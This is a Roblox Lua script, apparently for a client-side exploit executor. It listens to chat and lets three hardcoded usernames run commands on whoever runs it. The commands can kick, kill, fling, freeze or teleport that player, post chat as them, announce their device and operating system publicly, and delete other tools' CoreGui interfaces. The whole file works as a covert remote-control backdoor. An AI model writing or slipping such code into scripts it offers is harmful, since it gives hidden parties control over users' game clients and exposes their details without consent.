local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local UserInputService = game:GetService("UserInputService")

local Admins = {
    "IlIIllIlIIlIllIIlllI",
    "C4N0Fz",
    "hamza_pro231",
}

local Player = Players.LocalPlayer

local cmd = { commands = {} }
local conn = { connections = {} }
local var = { variables = {} }

function conn.new(name, event, callback)
    local ok, connection = pcall(function()
        return event:Connect(callback)
    end)
    if ok then
        conn.connections[name] = connection
        return connection
    end
end

function conn.remove(name)
    if conn.connections[name] then
        pcall(conn.connections[name].Disconnect, conn.connections[name])
        conn.connections[name] = nil
    end
end

function var.new(name, value)
    var.variables[name] = value
    return value
end

function var.get(name)
    return var.variables[name]
end

function var.set(name, value)
    var.variables[name] = value
end

var.new("originalWalkSpeed", 16)
var.new("originalJumpPower", 50)
var.new("isOrbiting", false)
var.new("isSpinning", false)
var.new("currentSpinSpeed", 0)
var.new("orbitConnection", nil)
var.new("spinConnection", nil)

function cmd.new(name, func)
    cmd.commands[name] = func
end

local function GetDevice()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    if touch and not keyboard and not mouse then
        return "Mobile"
    elseif not touch and keyboard and mouse then
        return "PC"
    else
        return "Unknown"
    end
end

local function GetOS()
    local platform = UserInputService:GetPlatform()
    local map = {
        [Enum.Platform.Windows] = "Windows",
        [Enum.Platform.OSX] = "macOS",
        [Enum.Platform.IOS] = "iOS",
        [Enum.Platform.Android] = "Android",
    }
    return map[platform] or "Unknown"
end

local function SendChat(message)
    pcall(function()
        if TextChatService.TextChannels then
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        end
    end)
end

cmd.new("getdevice", function()
    SendChat("Player Device: " .. GetDevice())
end)

cmd.new("getos", function()
    SendChat("Player OS: " .. GetOS())
end)

cmd.new("freeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        var.set("originalWalkSpeed", humanoid.WalkSpeed)
        var.set("originalJumpPower", humanoid.JumpPower)
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    if Player.Character then
        for _, part in ipairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
    end
end)

cmd.new("unfreeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = var.get("originalWalkSpeed")
        humanoid.JumpPower = var.get("originalJumpPower")
    end
    if Player.Character then
        for _, part in ipairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
    end
end)

cmd.new("walkspeed", function(args)
    local speed = tonumber(args[1])
    if speed then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.WalkSpeed = speed end
    end
end)

cmd.new("jumppower", function(args)
    local power = tonumber(args[1])
    if power then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.JumpPower = power end
    end
end)

cmd.new("fling", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    local root = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if root then
        local direction = Vector3.new(math.random(-100, 100), math.random(150, 600), math.random(-100, 100))
        root.Velocity = direction
        if humanoid then
            humanoid.Sit = true
        end
    end
end)

cmd.new("kill", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Health = 0 end
end)

cmd.new("void", function()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if root then root.CFrame = CFrame.new(0, -10000, 0) end
end)

cmd.new("sit", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Sit = true end
end)

cmd.new("orbit", function(args, admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not adminRoot or not localRoot then return end

    if var.get("isOrbiting") then
        var.set("isOrbiting", false)
        if var.get("orbitConnection") then
            var.get("orbitConnection"):Disconnect()
            var.set("orbitConnection", nil)
        end
    end

    var.set("isOrbiting", true)
    local angle, radius, speed = 0, 5, 2

    local orbitConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isOrbiting") or not adminRoot or not adminRoot.Parent or not localRoot then
            if var.get("orbitConnection") then
                var.get("orbitConnection"):Disconnect()
                var.set("orbitConnection", nil)
            end
            var.set("isOrbiting", false)
            return
        end
        angle = angle + speed * RunService.RenderStepped:Wait()
        local offset = CFrame.new(adminRoot.Position) * CFrame.Angles(0, angle, 0) * CFrame.new(radius, 0, 0)
        localRoot.CFrame = offset
    end)
    var.set("orbitConnection", orbitConnection)
end)

cmd.new("unorbit", function()
    var.set("isOrbiting", false)
    if var.get("orbitConnection") then
        var.get("orbitConnection"):Disconnect()
        var.set("orbitConnection", nil)
    end
end)

cmd.new("spin", function(args)
    local speedNum = tonumber(args[1]) or 5
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if var.get("isSpinning") then
        var.set("isSpinning", false)
        if var.get("spinConnection") then
            var.get("spinConnection"):Disconnect()
            var.set("spinConnection", nil)
        end
    end

    var.set("isSpinning", true)
    var.set("currentSpinSpeed", speedNum)

    local spinConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isSpinning") or not hrp then
            if var.get("spinConnection") then
                var.get("spinConnection"):Disconnect()
                var.set("spinConnection", nil)
            end
            var.set("isSpinning", false)
            return
        end
        local dt = RunService.RenderStepped:Wait()
        local rotation = CFrame.Angles(0, math.rad(var.get("currentSpinSpeed") * dt), 0)
        hrp.CFrame = hrp.CFrame * rotation
    end)
    var.set("spinConnection", spinConnection)
end)

cmd.new("unspin", function()
    var.set("isSpinning", false)
    if var.get("spinConnection") then
        var.get("spinConnection"):Disconnect()
        var.set("spinConnection", nil)
    end
end)

cmd.new("kick", function(args)
    local reason = #args > 0 and table.concat(args, " ") or "Kicked by admin"
    Player:Kick(reason)
end)

cmd.new("bring", function(args, admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if adminRoot and localRoot then
        localRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
    end
end)

cmd.new("chat", function(args)
    local msg = table.concat(args, " ")
    SendChat(msg)
end)

cmd.new("delexec", function()
    pcall(function()
        local whitelistedContainers = {
            ["RobloxGui"] = true, ["PlayerList"] = true, ["ExperienceChat"] = true,
            ["BubbleChat"] = true, ["DevConsole"] = true, ["SocialService"] = true,
            ["PerformanceStats"] = true, ["ScreenShotTool"] = true, ["EmotesMenu"] = true,
            ["CallDialogScreen"] = true, ["CaptureManager"] = true, ["CaptureOverlay"] = true,
            ["Composer"] = true, ["ContactList"] = true, ["Chat"] = true,
            ["HeadsetDisconnectedDialog"] = true, ["InExperienceInterventionApp"] = true,
            ["PlayerMenuScreen"] = true, ["PurchasePromptApp"] = true, ["RobloxPromptGui"] = true,
            ["ScreenshotsCarousel"] = true, ["TeleportEffectGui"] = true, ["TopBarApp"] = true,
            ["ControlGui"] = true, ["VehicleGui"] = true, ["NotificationGui"] = true,
            ["DescendantProtector"] = true, ["AppUpdaterGui"] = true, ["FaceTrackingGui"] = true,
            ["ExperienceNotificationGui"] = true, ["VoiceChatGui"] = true, ["SafetyCheckGui"] = true,
            ["ToastGui"] = true, ["InGameMenuV2"] = true, ["RightClickMenu"] = true,
            ["VoiceChatPromptGui"] = true, ["BottomBarGui"] = true, ["GuiService"] = true,
            ["FullscreenTitleBar"] = true, ["TextureView"] = true, ["ChromeGui"] = true,
            ["BlockingApp"] = true, ["HealthGui"] = true, ["StutterDetector"] = true,
            ["AvatarContextMenuItem"] = true
        }

        local function getTopLevelContainer(obj)
            local current = obj
            while current.Parent and current.Parent ~= CoreGui and current.Parent ~= game do
                current = current.Parent
            end
            return current
        end

        local function isJumbled(name)
            if string.match(name, "[^%w%s%-%.]") then return true end
            if #name > 30 then return true end
            local upperCount = #string.gsub(name, "[^A-Z]", "")
            local lowerCount = #string.gsub(name, "[^a-z]", "")
            local totalLetters = upperCount + lowerCount
            if totalLetters > 5 then
                if string.match(name, "%u%u%u") then return true end
                local _, vowelCount = string.gsub(name:lower(), "[aeiouy]", "")
                if vowelCount == 0 or (vowelCount / totalLetters) < 0.15 then return true end
                if upperCount > 1 and lowerCount > 1 and string.match(name, "%l%u%l") then return true end
            end
            return false
        end

        for _, obj in ipairs(CoreGui:GetDescendants()) do
            local topContainer = getTopLevelContainer(obj)
            if topContainer and whitelistedContainers[topContainer.Name] then
                continue
            end
            if isJumbled(obj.Name) then
                pcall(function() obj:Destroy() end)
            end
        end
    end)
end)

local function executeCommand(commandName, args, admin)
    local command = cmd.commands[commandName]
    if command then
        local success, err = pcall(command, args, admin)
        if not success then
            warn("[!" .. commandName .. " error]: " .. tostring(err))
        end
    end
end

local function onChatMessage(plr, msg)
    if plr == Player then return end
    if not table.find(Admins, plr.Name) then return end

    local commandMsg

    if string.sub(msg, 1, 1) == "!" then
        commandMsg = string.sub(msg, 2)
    elseif string.sub(msg, 1, 3) == "/e " then
        commandMsg = string.sub(msg, 4)
    else
        return
    end

    local parts = {}
    for part in string.gmatch(commandMsg, "%S+") do
        table.insert(parts, part)
    end

    if #parts > 0 then
        local cmdName = string.lower(parts[1])
        local args = { table.unpack(parts, 2) }
        executeCommand(cmdName, args, plr)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) onChatMessage(plr, msg) end)
end

conn.new("player_added", Players.PlayerAdded, function(plr)
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) onChatMessage(plr, msg) end)
end)
